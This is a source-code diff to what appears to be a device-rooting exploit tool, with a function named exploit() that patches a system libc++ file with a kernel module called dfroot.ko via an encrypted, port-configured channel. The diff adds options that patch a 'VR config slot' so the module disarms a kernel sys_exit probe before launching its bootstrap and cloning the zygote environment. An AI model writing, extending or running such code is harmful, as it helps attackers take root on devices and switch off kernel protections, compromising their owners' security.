@@ -27,6 +27,8 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+static uint64_t g_vr_off;
+static int      g_vr_auto;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -382,6 +384,29 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+
+    if (g_vr_off || g_vr_auto) {
+        static const unsigned char magic[8] =
+                { 0x16, 0xFF, 0xC0, 0xDF, 0x16, 0xFF, 0xC0, 0xDF };
+        int configured = 0;
+        for (size_t i = 0; i + 24 <= len; i++) {
+            if (memcmp(buf + i, magic, sizeof(magic)) != 0) continue;
+            uint64_t offset = g_vr_auto ? 0 : g_vr_off;
+            uint64_t automatic = g_vr_auto ? 1 : 0;
+            memcpy(buf + i + 8, &offset, sizeof(offset));
+            memcpy(buf + i + 16, &automatic, sizeof(automatic));
+            configured = 1;
+            printf("vr: config slot patched (%s)\n",
+                   g_vr_auto ? "running kernel BTF" : "provided funcs offset");
+            break;
+        }
+        if (!configured) {
+            printf("vr: ERROR - selected KMI module has no VR config slot; refusing to continue\n");
+            free(buf);
+            return 1;
+        }
+    }
+
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
@@ -502,7 +527,8 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX"
+            " [--vr-off N | --vr-auto]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -521,9 +547,14 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--vr-off") && i + 1 < argc)
+            g_vr_off = strtoull(argv[++i], NULL, 0);
+        else if (!strcmp(a, "--vr-auto"))
+            g_vr_auto = 1;
         else { usage(argv[0]); return 2; }
     }
-    if (!encap_port || !sender_port || !spi || !have_aes) {
+    if (!encap_port || !sender_port || !spi || !have_aes ||
+            (g_vr_auto && g_vr_off) || g_vr_off > 0x100) {
         usage(argv[0]); return 2;
     }
 
@@ -532,6 +563,10 @@ static int setup(int argc, char **argv) {
     g_spi         = spi;
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
+    if (g_vr_auto)
+        printf("vr funcs offset: auto-resolve from running kernel BTF\n");
+    else if (g_vr_off)
+        printf("vr funcs offset: %llu\n", (unsigned long long)g_vr_off);
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
@@ -569,6 +604,10 @@ static int exploit(void) {
     } markers[] = {
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
+        { "/dev/dfvr0", "vr: sys_exit probe disarmed (funcs = NULL)",       -1 },
+        { "/dev/dfvre", "vr: ERROR - probe disarm failed, aborting before manager", 4 },
+        { "/dev/dfvra", "vr: runtime BTF offset resolved",                  -1 },
+        { "/dev/dfvrx", "vr: ERROR - runtime BTF resolution failed, aborting before manager", 4 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
         { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
